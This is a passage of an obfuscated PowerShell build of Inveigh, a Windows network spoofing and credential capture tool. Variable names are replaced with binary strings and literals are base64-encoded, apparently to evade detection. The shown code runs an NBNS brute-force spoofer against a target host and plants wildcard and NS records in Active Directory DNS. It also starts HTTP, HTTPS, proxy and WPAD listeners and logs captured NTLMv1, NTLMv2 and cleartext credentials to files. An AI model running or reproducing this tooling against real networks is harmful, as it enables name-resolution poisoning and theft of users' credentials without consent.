    param ($NBNSBruteForceHost,$NBNSBruteForcePause,$NBNSBruteForceTarget,$NBNSTTL,$SpooferIP)
    $NBNSBruteForceHost = $NBNSBruteForceHost.ToUpper()
    ${10110110001011001} = 0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,
                        0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x41,0x41,0x00
    ${01000000001110011} = [System.Text.Encoding]::UTF8.GetBytes($NBNSBruteForceHost)
    ${01000000001110011} = [System.BitConverter]::ToString(${01000000001110011})
    ${01000000001110011} = ${01000000001110011}.Replace("-","")
    ${01000000001110011} = [System.Text.Encoding]::UTF8.GetBytes(${01000000001110011})
    ${01101101001000011} = [System.BitConverter]::GetBytes($NBNSTTL)
    [Array]::Reverse(${01101101001000011})
    for(${01100001111100111}=0; ${01100001111100111} -lt ${01000000001110011}.Count; ${01100001111100111}++)
    {
        if(${01000000001110011}[${01100001111100111}] -gt 64)
        {
            ${10110110001011001}[${01100001111100111}] = ${01000000001110011}[${01100001111100111}] + 10
        }
        else
        {
            ${10110110001011001}[${01100001111100111}] = ${01000000001110011}[${01100001111100111}] + 17
        }
    }
    ${01000010100010010} = 0x00,0x00,0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +
                            ${10110110001011001} +
                            0x00,0x20,0x00,0x01 +
                            ${01101101001000011} +
                            0x00,0x06,0x00,0x00 +
                            ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes() +
                            0x00,0x00,0x00,0x00
    ${00101000010000101}.output_queue.Add("[*] [$(Get-Date -format s)] Starting NBNS brute force spoofer to resolve $NBNSBruteForceHost on $NBNSBruteForceTarget") > $null
    ${00100100111011011} = $false          
    ${01110011110000100} = New-Object System.Net.Sockets.UdpClient(137)
    ${10101101011010000} = [System.Net.IPAddress]::Parse($NBNSBruteForceTarget)
    ${01101000001111001} = New-Object Net.IPEndpoint(${10101101011010000},137)
    ${01110011110000100}.Connect(${01101000001111001})
    while(${00101000010000101}.running)
    {
        :NBNS_spoofer_loop while (!${00101000010000101}.hostname_spoof -and ${00101000010000101}.running)
        {
            if(${00100100111011011})
            {
                ${00101000010000101}.output_queue.Add("[*] [$(Get-Date -format s)] Resuming NBNS brute force spoofer") > $null
                ${00100100111011011} = $false
            }
            for (${01100001111100111} = 0; ${01100001111100111} -lt 255; ${01100001111100111}++)
            {
                for (${00111010100111110} = 0; ${00111010100111110} -lt 255; ${00111010100111110}++)
                {
                    ${01000010100010010}[0] = ${01100001111100111}
                    ${01000010100010010}[1] = ${00111010100111110}                 
                    ${01110011110000100}.send(${01000010100010010},${01000010100010010}.Length)
                    if(${00101000010000101}.hostname_spoof -and $NBNSBruteForcePause)
                    {
                        ${00101000010000101}.output_queue.Add("[*] [$(Get-Date -format s)] Pausing NBNS brute force spoofer") > $null
                        ${00100100111011011} = $true
                        break NBNS_spoofer_loop
                    }
                }
            }
        }
        sleep -m 5
    }
    ${01110011110000100}.Close()
}
${10101001001001001} =
{
    param ($ADIDNSACE,$ADIDNSCleanup,[System.Management.Automation.PSCredential]$ADIDNSCredential,$ADIDNSDomain,
        $ADIDNSDomainController,$ADIDNSForest,$ADIDNSHostsIgnore,$ADIDNSNS,$ADIDNSNSTarget,$ADIDNSPartition,
        $ADIDNSThreshold,$ADIDNSTTL,$ADIDNSZone,$ConsoleQueueLimit,${00010001111001000},$NBNSBruteForcePause,
        $RunCount,$RunTime,$SpooferIP)
    function _10111000100001000
    {
        while(${00101000010000101}.output_queue.Count -gt 0)
        {
            ${00101000010000101}.console_queue.Add(${00101000010000101}.output_queue[0]) > $null
            if(${00101000010000101}.file_output)
            {
                if (${00101000010000101}.output_queue[0].StartsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIAA=')))) -or ${00101000010000101}.output_queue[0].StartsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIAA=')))) -or ${00101000010000101}.output_queue[0].StartsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIAA=')))) -or ${00101000010000101}.output_queue[0].StartsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIAA=')))))
                {
                    ${00101000010000101}.log_file_queue.Add(${00101000010000101}.output_queue[0]) > $null
                }
                else
                {
                    ${00101000010000101}.log_file_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwByAGUAZABhAGMAdABlAGQAXQA=')))) > $null    
                }
            }
            if(${00101000010000101}.log_output)
            {
                ${00101000010000101}.log.Add(${00101000010000101}.output_queue[0]) > $null
            }
            ${00101000010000101}.output_queue.RemoveAt(0)
        }
    }
    function _00101001011100101
    {
        param ([String]${_10100011001111011})
        if(${00101000010000101}.HTTPS -and !${00101000010000101}.HTTPS_existing_certificate -or (${00101000010000101}.HTTPS_existing_certificate -and ${00101000010000101}.HTTPS_force_certificate_delete))
        {
            try
            {
                ${10110011110101001} = New-Object System.Security.Cryptography.X509Certificates.X509Store("My",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAE0AYQBjAGgAaQBuAGUA'))))
                ${10110011110101001}.Open($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABXAHIAaQB0AGUA'))))
                ${10101010000100101} = (ls Cert:\LocalMachine\My | ? {$_.Issuer -Like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0A'))) + ${00101000010000101}.certificate_issuer})
                foreach(${01100001100101100} in ${10101010000100101})
                {
                    ${10110011110101001}.Remove(${01100001100101100})
                }
                ${10110011110101001}.Close()
            }
            catch
            {
                ${00101000010000101}.output_queue.Add("[-] [$(Get-Date -format s)] SSL Certificate Deletion Error [Remove Manually]") > $null
            }
        }
        if($ADIDNSCleanup -eq 'Y' -and ${00101000010000101}.ADIDNS_table.Count -gt 0)
        {
            [Array]${00010110100001001} = ${00101000010000101}.ADIDNS_table.Keys
            foreach(${10110100111011000} in ${00010110100001001})
            {
                if(${00101000010000101}.ADIDNS_table.${10110100111011000} -ge 1)
                {
                    try
                    {
                        _10001101110101000 -_10011000001001110 $ADIDNSCredential -_01011011111110110 $ADIDNSDomain -_10100000011110001 $ADIDNSDomainController -_10000011100010111 ${10110100111011000} -_00001011001101001 $ADIDNSPartition -_01111111110001111 $ADIDNSZone
                        ${00101000010000101}.ADIDNS_table.${10110100111011000} = $null
                    }
                    catch
                    {
                        ${01100011111101101} = $_.Exception.Message
                        ${01100011111101101} = ${01100011111101101} -replace "`n",""
                        ${00101000010000101}.output_queue.Add("[!] [$(Get-Date -format s)] ${01100011111101101} $($_.InvocationInfo.Line.Trim())") > $null
                        ${00101000010000101}.output_queue.Add("[-] [$(Get-Date -format s)] ADIDNS host record for ${10110100111011000} remove failed") > $null
                    }
                }
            }
        }
        if(${00101000010000101}.relay_running)
        {
            sleep -m 100
            if(${_10100011001111011})
            {
                ${00101000010000101}.output_queue.Add("[*] [$(Get-Date -format s)] Inveigh Relay is exiting due to ${_10100011001111011}") > $null
            }
            else
            {
                ${00101000010000101}.output_queue.Add("[*] [$(Get-Date -format s)] Inveigh Relay is exiting") > $null  
            }
            if(!${00101000010000101}.running)
            {
                _10111000100001000
                sleep -m 100
            }
            ${00101000010000101}.relay_running = $false
        }
        if(${00101000010000101}.running)
        {
            if(${_10100011001111011})
            {
                ${00101000010000101}.output_queue.Add("[*] [$(Get-Date -format s)] Inveigh is exiting due to ${_10100011001111011}") > $null
            }
            else
            {
                ${00101000010000101}.output_queue.Add("[*] [$(Get-Date -format s)] Inveigh is exiting") > $null  
            }
            _10111000100001000
            if(!${00010001111001000})
            {
                sleep -s 3
            }
            ${00101000010000101}.running = $false
        }
        ${00101000010000101}.ADIDNS = $null
        ${00101000010000101}.HTTPS = $false
    }
    if(${00101000010000101}.ADIDNS -contains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAGwAZABjAGEAcgBkAA=='))))
    {
        _10010001100110110 -_10011000001001110 $ADIDNSCredential -_01001100010001111 $SpooferIP -_01011011111110110 $ADIDNSDomain -_10100000011110001 $ADIDNSDomainController -_01000000000001011 $ADIDNSForest -_10000011100010111 '*' -_00001011001101001 $ADIDNSPartition -_10110011101001001 'A'-_00010010110111100 $ADIDNSTTL -_01111111110001111 $ADIDNSZone
    }
    if(${00101000010000101}.ADIDNS -contains 'NS')
    {
        if($ADIDNSNSTarget.EndsWith($ADIDNSZone))
        {
            ${01110111111100011} = $ADIDNSNSTarget
            $ADIDNSNSTarget = $ADIDNSNSTarget -replace $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgAkAEEARABJAEQATgBTAFoAbwBuAGUA'))),''
        }
        else
        {
            ${01110111111100011} = $ADIDNSNSTarget + "." + $ADIDNSZone
        }
        _10010001100110110 -_10011000001001110 $ADIDNSCredential -_01001100010001111 $SpooferIP -_01011011111110110 $ADIDNSDomain -_10100000011110001 $ADIDNSDomainController -_01000000000001011 $ADIDNSForest -_10000011100010111 $ADIDNSNSTarget -_00001011001101001 $ADIDNSPartition -_10110011101001001 'A' -_00010010110111100 $ADIDNSTTL -_01111111110001111 $ADIDNSZone
        _10010001100110110 -_10011000001001110 $ADIDNSCredential -_01001100010001111 ${01110111111100011} -_01011011111110110 $ADIDNSDomain -_10100000011110001 $ADIDNSDomainController -_01000000000001011 $ADIDNSForest -_10000011100010111 $ADIDNSNS -_00001011001101001 $ADIDNSPartition -_10110011101001001 'NS' -_00010010110111100 $ADIDNSTTL -_01111111110001111 $ADIDNSZone
    }
    if($NBNSBruteForcePause)
    {   
        ${10110001111110010} = New-TimeSpan -Seconds $NBNSBruteForcePause
    }
    ${00010101010011110} = $RunCount + ${00101000010000101}.NTLMv1_list.Count
    ${10001100101010101} = $RunCount + ${00101000010000101}.NTLMv2_list.Count
    ${00000001101101000} = $RunCount + ${00101000010000101}.cleartext_list.Count
    if($RunTime)
    {    
        ${00111111011111111} = New-TimeSpan -Minutes $RunTime
        ${10000000100101100} = [System.Diagnostics.Stopwatch]::StartNew()
    }
    while(${00101000010000101}.running)
    {
        if($NBNSBruteForcePause -and ${00101000010000101}.hostname_spoof)
        {
            if(${00101000010000101}.NBNS_stopwatch.Elapsed -ge ${10110001111110010})
            {
                ${00101000010000101}.hostname_spoof = $false
            }
        }
        if($RunCount)
        {
            if(${00101000010000101}.NTLMv1_list.Count -ge ${00010101010011110} -or ${00101000010000101}.NTLMv2_list.Count -ge ${10001100101010101} -or ${00101000010000101}.cleartext_list.Count -ge ${00000001101101000})
            {
                _00101001011100101 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBlAGEAYwBoAGkAbgBnACAAcgB1AG4AIABjAG8AdQBuAHQA')))           
            }
        }
        if($RunTime)
        {
            if(${10000000100101100}.Elapsed -ge ${00111111011111111})
            {
                _00101001011100101 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBlAGEAYwBoAGkAbgBnACAAcgB1AG4AIAB0AGkAbQBlAA==')))
            }
        }
        if(${00101000010000101}.ADIDNS -contains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AYgBvAA=='))) -and ${00101000010000101}.request_table_updated)
        {
            try
            {
                _10100110010011001 -_10011000001001110 $ADIDNSCredential -_01001100010001111 $SpooferIP -_01011011111110110 $ADIDNSDomain -_10100000011110001 $ADIDNSDomainController -_01000000000001011 $ADIDNSForest -_10111110111011000 $ADIDNSHostsIgnore -_00001011001101001 $ADIDNSPartition -_10011000000101110 ${00101000010000101}.request_table -_01001111001110101 $ADIDNSThreshold -_00010010110111100 $ADIDNSTTL -_01111111110001111 $ADIDNSZone
            }
            catch
            {
                ${01100011111101101} = $_.Exception.Message
                ${01100011111101101} = ${01100011111101101} -replace "`n",""
                ${00101000010000101}.output_queue.Add("[!] [$(Get-Date -format s)] ${01100011111101101} $($_.InvocationInfo.Line.Trim())") > $null
            }
            ${00101000010000101}.request_table_updated = $false
        }
        if(${00101000010000101}.ADIDNS -and ${00101000010000101}.ADIDNS_table.Count -gt 0)
        {
            [Array]${00010110100001001} = ${00101000010000101}.ADIDNS_table.Keys
            foreach(${10110100111011000} in ${00010110100001001})
            {
                if(${00101000010000101}.ADIDNS_table.${10110100111011000} -eq 1)
                {
                    try
                    {
                        _10010001101101011 -_10011000001001110 $ADIDNSCredential -_01011011111110110 $ADIDNSDomain -_10100000011110001 $ADIDNSDomainController -_10000011100010111 ${10110100111011000} -_01001100100001001 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABlAG4AdABpAGMAYQB0AGUAZAAgAFUAcwBlAHIAcwA=')))-_01111111110001111 $ADIDNSZone
                        ${00101000010000101}.ADIDNS_table.${10110100111011000} = 2
                    }
                    catch
                    {
                        ${01100011111101101} = $_.Exception.Message
                        ${01100011111101101} = ${01100011111101101} -replace "`n",""
                        ${00101000010000101}.output_queue.Add("[!] [$(Get-Date -format s)] ${01100011111101101} $($_.InvocationInfo.Line.Trim())") > $null
                        ${00101000010000101}.output_queue.Add("[!] [$(Get-Date -format s)] ADIDNS ACE add for host record for ${10110100111011000} failed") > $null
                    }
                }
            }
        }
        if(${00101000010000101}.file_output)
        {
            while(${00101000010000101}.log_file_queue.Count -gt 0)
            {
                ${00101000010000101}.log_file_queue[0]|Out-File ${00101000010000101}.log_out_file -Append
                ${00101000010000101}.log_file_queue.RemoveAt(0)
            }
            while(${00101000010000101}.NTLMv1_file_queue.Count -gt 0)
            {
                ${00101000010000101}.NTLMv1_file_queue[0]|Out-File ${00101000010000101}.NTLMv1_out_file -Append
                ${00101000010000101}.NTLMv1_file_queue.RemoveAt(0)
            }
            while(${00101000010000101}.NTLMv2_file_queue.Count -gt 0)
            {
                ${00101000010000101}.NTLMv2_file_queue[0]|Out-File ${00101000010000101}.NTLMv2_out_file -Append
                ${00101000010000101}.NTLMv2_file_queue.RemoveAt(0)
            }
            while(${00101000010000101}.cleartext_file_queue.Count -gt 0)
            {
                ${00101000010000101}.cleartext_file_queue[0]|Out-File ${00101000010000101}.cleartext_out_file -Append
                ${00101000010000101}.cleartext_file_queue.RemoveAt(0)
            }
            while(${00101000010000101}.POST_request_file_queue.Count -gt 0)
            {
                ${00101000010000101}.POST_request_file_queue[0]|Out-File ${00101000010000101}.POST_request_out_file -Append
                ${00101000010000101}.POST_request_file_queue.RemoveAt(0)
            }
        }
        if(!${00101000010000101}.console_output -and $ConsoleQueueLimit -ge 0)
        {
            while(${00101000010000101}.console_queue.Count -gt $ConsoleQueueLimit -and !${00101000010000101}.console_output)
            {
                ${00101000010000101}.console_queue.RemoveAt(0)
            }
        }
        if(!${00101000010000101}.status_output)
        {
            _10111000100001000
        }
        sleep -m 5
        if(${00101000010000101}.stop)
        {
            ${00101000010000101}.console_queue.Clear()
            _00101001011100101
        }
    }
}
function _10100111011011110
{
    ${10001000111110111} = $false
    ${01010110111111100} = $false
    ${00000001111001110} = [RunspaceFactory]::CreateRunspace()
    ${00000001111001110}.Open()
    ${00000001111001110}.SessionStateProxy.SetVariable($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHYAZQBpAGcAaAA='))),${00101000010000101})
    ${01000000001011110} = [PowerShell]::Create()
    ${01000000001011110}.Runspace = ${00000001111001110}
    ${01000000001011110}.AddScript(${10000101011101001}) > $null
    ${01000000001011110}.AddScript(${00011100010001110}) > $null
    ${01000000001011110}.AddScript(${01011000110000000}) > $null
    ${01000000001011110}.AddScript(${10011010110001111}).AddArgument($Challenge).AddArgument($Kerberos).AddArgument(
        $KerberosCount).AddArgument($KerberosCredential).AddArgument($KerberosHash).AddArgument(
        $KerberosHostHeader).AddArgument($HTTPAuth).AddArgument($HTTPBasicRealm).AddArgument(
        $HTTPContentType).AddArgument($HTTPIP).AddArgument($HTTPPort).AddArgument(
        $HTTPDefaultEXE).AddArgument($HTTPDefaultFile).AddArgument($HTTPDirectory).AddArgument(
        $HTTPResponse).AddArgument(${01010110111111100}).AddArgument($IP).AddArgument($NBNSBruteForcePause).AddArgument(
        ${00110110010110001}).AddArgument($Proxy).AddArgument($ProxyIgnore).AddArgument(${10001000111110111}).AddArgument(
        $WPADAuth).AddArgument($WPADAuthIgnore).AddArgument($WPADResponse) > $null
    ${01000000001011110}.BeginInvoke() > $null
}
sleep -m 50
function _00101100111110011
{
    ${10001000111110111} = $false
    ${01010110111111100} = $true
    ${00100100111001111} = [RunspaceFactory]::CreateRunspace()
    ${00100100111001111}.Open()
    ${00100100111001111}.SessionStateProxy.SetVariable($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHYAZQBpAGcAaAA='))),${00101000010000101})
    ${00101010011010011} = [PowerShell]::Create()
    ${00101010011010011}.Runspace = ${00100100111001111}
    ${00101010011010011}.AddScript(${10000101011101001}) > $null
    ${00101010011010011}.AddScript(${00011100010001110}) > $null
    ${00101010011010011}.AddScript(${01011000110000000}) > $null
    ${00101010011010011}.AddScript(${10011010110001111}).AddArgument($Challenge).AddArgument($Kerberos).AddArgument(
        $KerberosCount).AddArgument($KerberosCredential).AddArgument($KerberosHash).AddArgument(
        $KerberosHostHeader).AddArgument($HTTPAuth).AddArgument($HTTPBasicRealm).AddArgument(
        $HTTPContentType).AddArgument($HTTPIP).AddArgument($HTTPSPort).AddArgument(
        $HTTPDefaultEXE).AddArgument($HTTPDefaultFile).AddArgument($HTTPDirectory).AddArgument(
        $HTTPResponse).AddArgument(${01010110111111100}).AddArgument($IP).AddArgument($NBNSBruteForcePause).AddArgument(
        ${00110110010110001}).AddArgument($Proxy).AddArgument($ProxyIgnore).AddArgument(${10001000111110111}).AddArgument(
        $WPADAuth).AddArgument($WPADAuthIgnore).AddArgument($WPADResponse) > $null
    ${00101010011010011}.BeginInvoke() > $null
}
sleep -m 50
function _10110011101110011
{
    ${10001000111110111} = $true
    ${01010110111111100} = $false
    ${10000111010000001} = [RunspaceFactory]::CreateRunspace()
    ${10000111010000001}.Open()
    ${10000111010000001}.SessionStateProxy.SetVariable($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHYAZQBpAGcAaAA='))),${00101000010000101})
    ${00000101110101101} = [PowerShell]::Create()
    ${00000101110101101}.Runspace = ${10000111010000001}
    ${00000101110101101}.AddScript(${10000101011101001}) > $null
    ${00000101110101101}.AddScript(${00011100010001110}) > $null
    ${00000101110101101}.AddScript(${01011000110000000}) > $null
    ${00000101110101101}.AddScript(${10011010110001111}).AddArgument($Challenge).AddArgument($Kerberos).AddArgument(
        $KerberosCount).AddArgument($KerberosCredential).AddArgument($KerberosHash).AddArgument(
        $KerberosHostHeader).AddArgument($HTTPAuth).AddArgument($HTTPBasicRealm).AddArgument(
        $HTTPContentType).AddArgument($ProxyIP).AddArgument($ProxyPort).AddArgument(
        $HTTPDefaultEXE).AddArgument($HTTPDefaultFile).AddArgument($HTTPDirectory).AddArgument(
        $HTTPResponse).AddArgument(${01010110111111100}).AddArgument($IP).AddArgument($NBNSBruteForcePause).AddArgument(
        ${00110110010110001}).AddArgument($Proxy).AddArgument($ProxyIgnore).AddArgument(${10001000111110111}).AddArgument(
        $WPADAuth).AddArgument($WPADAuthIgnore).AddArgument($WPADResponse) > $null
    ${00000101110101101}.BeginInvoke() > $null
}
function _10000110110010101
{
    ${01010000001010001} = [RunspaceFactory]::CreateRunspace()
    ${01010000001010001}.Open()
    ${01010000001010001}.SessionStateProxy.SetVariable($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHYAZQBpAGcAaAA='))),${00101000010000101})
    ${10011101011111100} = [PowerShell]::Create()
    ${10011101011111100}.Runspace = ${01010000001010001}
    ${10011101011111100}.AddScript(${10000101011101001}) > $null
    ${10011101011111100}.AddScript(${00011100010001110}) > $null
    ${10011101011111100}.AddScript(${01011000110000000}) > $null
    ${10011101011111100}.AddScript(${01000101100000110}) > $null
    ${10011101011111100}.AddScript(${10001100011000101}).AddArgument($DNS).AddArgument($DNSTTL).AddArgument(
        $EvadeRG).AddArgument($Inspect).AddArgument($IP).AddArgument($Kerberos).AddArgument($KerberosCount).AddArgument(
        $KerberosCredential).AddArgument($KerberosHash).AddArgument($LLMNR).AddArgument(
        $LLMNRTTL).AddArgument($mDNS).AddArgument($mDNSTypes).AddArgument($mDNSTTL).AddArgument($NBNS).AddArgument(
        $NBNSTTL).AddArgument($NBNSTypes).AddArgument(${00110110010110001}).AddArgument($Pcap).AddArgument(
        $PcapTCP).AddArgument($PcapUDP).AddArgument($SMB).AddArgument($SpooferHostsIgnore).AddArgument(
        $SpooferHostsReply).AddArgument($SpooferIP).AddArgument($SpooferIPsIgnore).AddArgument(
        $SpooferIPsReply).AddArgument($SpooferLearning).AddArgument($SpooferLearningDelay).AddArgument(
        $SpooferLearningInterval).AddArgument($SpooferNonprintable).AddArgument(
        $SpooferThresholdHost).AddArgument($SpooferThresholdNetwork) > $null
    ${10011101011111100}.BeginInvoke() > $null
}
function _01001001110101101
{
    ${00011111111101100} = [RunspaceFactory]::CreateRunspace()
    ${00011111111101100}.Open()
    ${00011111111101100}.SessionStateProxy.SetVariable($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHYAZQBpAGcAaAA='))),${00101000010000101})
    ${01000011010000110} = [PowerShell]::Create()
    ${01000011010000110}.Runspace = ${00011111111101100}
    ${01000011010000110}.AddScript(${10000101011101001}) > $null
    ${01000011010000110}.AddScript(${10101101000100000}).AddArgument($Inspect).AddArgument(
        $DNSTTL).AddArgument($SpooferIP) > $null
    ${01000011010000110}.BeginInvoke() > $null
}
function _00100011110110100
{
    ${10011100011000000} = [RunspaceFactory]::CreateRunspace()
    ${10011100011000000}.Open()
    ${10011100011000000}.SessionStateProxy.SetVariable($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHYAZQBpAGcAaAA='))),${00101000010000101})
    ${10111111110111111} = [PowerShell]::Create()
    ${10111111110111111}.Runspace = ${10011100011000000}
    ${10111111110111111}.AddScript(${10000101011101001}) > $null
    ${10111111110111111}.AddScript(${10100110000000100}).AddArgument($Inspect).AddArgument(
        $LLMNRTTL).AddArgument($SpooferIP).AddArgument($SpooferHostsReply).AddArgument(
        $SpooferHostsIgnore).AddArgument($SpooferIPsReply).AddArgument(
        $SpooferIPsIgnore).AddArgument($SpooferNonprintable) > $null
    ${10111111110111111}.BeginInvoke() > $null
}
function _01110100000110100
{
    ${01110100001010101} = [RunspaceFactory]::CreateRunspace()
    ${01110100001010101}.Open()
    ${01110100001010101}.SessionStateProxy.SetVariable($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHYAZQBpAGcAaAA='))),${00101000010000101})
    ${10010100011010111} = [PowerShell]::Create()
    ${10010100011010111}.Runspace = ${01110100001010101}
    ${10010100011010111}.AddScript(${10000101011101001}) > $null
    ${10010100011010111}.AddScript(${10001000000111000}).AddArgument($Inspect).AddArgument(
        $mDNSTTL).AddArgument($mDNSTypes).AddArgument($SpooferIP).AddArgument($SpooferHostsReply).AddArgument(
        $SpooferHostsIgnore).AddArgument($SpooferIPsReply).AddArgument($SpooferIPsIgnore) > $null
    ${10010100011010111}.BeginInvoke() > $null
}
function _01110111110001111
{
    ${00001111110011010} = [RunspaceFactory]::CreateRunspace()
    ${00001111110011010}.Open()
    ${00001111110011010}.SessionStateProxy.SetVariable($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHYAZQBpAGcAaAA='))),${00101000010000101})
    ${01101111001011011} = [PowerShell]::Create()
    ${01101111001011011}.Runspace = ${00001111110011010}
    ${01101111001011011}.AddScript(${10000101011101001}) > $null
    ${01101111001011011}.AddScript(${10011001111010100}).AddArgument($Inspect).AddArgument(
        $IP).AddArgument($NBNSTTL).AddArgument($NBNSTypes).AddArgument($SpooferIP).AddArgument(
        $SpooferHostsIgnore).AddArgument($SpooferHostsReply).AddArgument($SpooferIPsIgnore).AddArgument(
        $SpooferIPsReply).AddArgument($SpooferNonprintable) > $null
    ${01101111001011011}.BeginInvoke() > $null
}
function _10111011011000100
{
    ${10000011000001010} = [RunspaceFactory]::CreateRunspace()
    ${10000011000001010}.Open()
    ${10000011000001010}.SessionStateProxy.SetVariable($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHYAZQBpAGcAaAA='))),${00101000010000101})
    ${01011100101110011} = [PowerShell]::Create()
    ${01011100101110011}.Runspace = ${10000011000001010}
    ${01011100101110011}.AddScript(${10000101011101001}) > $null
    ${01011100101110011}.AddScript(${01000110011110000}).AddArgument(
    $NBNSBruteForceHost).AddArgument($NBNSBruteForcePause).AddArgument($NBNSBruteForceTarget).AddArgument(
    $NBNSTTL).AddArgument($SpooferIP) > $null
    ${01011100101110011}.BeginInvoke() > $null
}
function _00001110110011101
{
    ${00001111010000100} = [RunspaceFactory]::CreateRunspace()
    ${00001111010000100}.Open()
    ${00001111010000100}.SessionStateProxy.SetVariable($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHYAZQBpAGcAaAA='))),${00101000010000101})
    ${01000100100000100} = [PowerShell]::Create()
    ${01000100100000100}.Runspace = ${00001111010000100}
    ${01000100100000100}.AddScript(${10000101011101001}) > $null
    ${01000100100000100}.AddScript(${00101111101110111}) > $null
    ${01000100100000100}.AddScript(${10101001001001001}).AddArgument($ADIDNSACE).AddArgument(
        $ADIDNSCleanup).AddArgument($ADIDNSCredential).AddArgument($ADIDNSDomain).AddArgument(
        $ADIDNSDomainController).AddArgument($ADIDNSForest).AddArgument($ADIDNSHostsIgnore).AddArgument(
        $ADIDNSNS).AddArgument($ADIDNSNSTarget).AddArgument($ADIDNSPartition).AddArgument(
        $ADIDNSThreshold).AddArgument($ADIDNSTTL).AddArgument($ADIDNSZone).AddArgument(
        $ConsoleQueueLimit).AddArgument(${00010001111001000}).AddArgument($NBNSBruteForcePause).AddArgument(
        $RunCount).AddArgument($RunTime).AddArgument($SpooferIP) > $null
    ${01000100100000100}.BeginInvoke() > $null
}
if($HTTP -eq 'Y')
{
    _10100111011011110
}
if($HTTPS -eq 'Y')
{
    _00101100111110011
}
if($Proxy -eq 'Y')
{
    _10110011101110011
}
if(($DNS -eq 'Y' -or $LLMNR -eq 'Y' -or $mDNS -eq 'Y' -or $NBNS -eq 'Y' -or $SMB -eq 'Y' -or $Inspect) -and ${00010001111001000})
{ 
    _10000110110010101
}
elseif(($DNS -eq 'Y' -or $LLMNR -eq 'Y' -or $mDNS -eq 'Y' -or $NBNS -eq 'Y' -or $SMB -eq 'Y') -and !${00010001111001000})
{
    if($DNS -eq 'Y')
    {
        _01001001110101101
    }
    if($LLMNR -eq 'Y')
    {
        _00100011110110100
    }
    if($mDNS -eq 'Y')
    {
        _01110100000110100
    }
    if($NBNS -eq 'Y')
    {
        _01110111110001111
    }
    if($NBNSBruteForce -eq 'Y')
    {
        _10111011011000100
    }
}
if($NBNSBruteForce -eq 'Y')
{
    _10111011011000100
}
_00001110110011101
try
{
    if($ConsoleOutput -ne 'N')
    {
        if($ConsoleStatus)
        {    
            ${00100000000111001} = New-TimeSpan -Minutes $ConsoleStatus
            ${00101011011000010} = [System.Diagnostics.Stopwatch]::StartNew()
        }
        :console_loop while((${00101000010000101}.running -and ${00101000010000101}.console_output) -or (${00101000010000101}.console_queue.Count -gt 0 -and ${00101000010000101}.console_output))
        {
            while(${00101000010000101}.console_queue.Count -gt 0)
            {
                switch -wildcard (${00101000010000101}.console_queue[0])
                {
                    {$_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PwBbACEAXQAqAA=='))) -or $_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PwBbAC0AXQAqAA==')))}
                    {
                        if(${00101000010000101}.output_stream_only)
                        {
                            echo(${00101000010000101}.console_queue[0] + ${00101000010000101}.newline)
                        }
                        else
                        {
                            Write-Warning(${00101000010000101}.console_queue[0])
                        }
                        ${00101000010000101}.console_queue.RemoveAt(0)
                    }
                    {$_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAHMAcABvAG8AZgBlAHIAIABkAGkAcwBhAGIAbABlAGQA'))) -or $_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAGwAbwBjAGEAbAAgAHIAZQBxAHUAZQBzAHQA'))) -or $_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAGgAbwBzAHQAIABoAGUAYQBkAGUAcgAgACoA'))) -or $_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAHUAcwBlAHIAIABhAGcAZQBuAHQAIAByAGUAYwBlAGkAdgBlAGQAIAAqAA==')))}
                    {
                        if($ConsoleOutput -eq 'Y')
                        {
                            if(${00101000010000101}.output_stream_only)
                            {
                                echo(${00101000010000101}.console_queue[0] + ${00101000010000101}.newline)
                            }
                            else
                            {
                                echo(${00101000010000101}.console_queue[0])
                            }
                        }
                        ${00101000010000101}.console_queue.RemoveAt(0)
                    } 
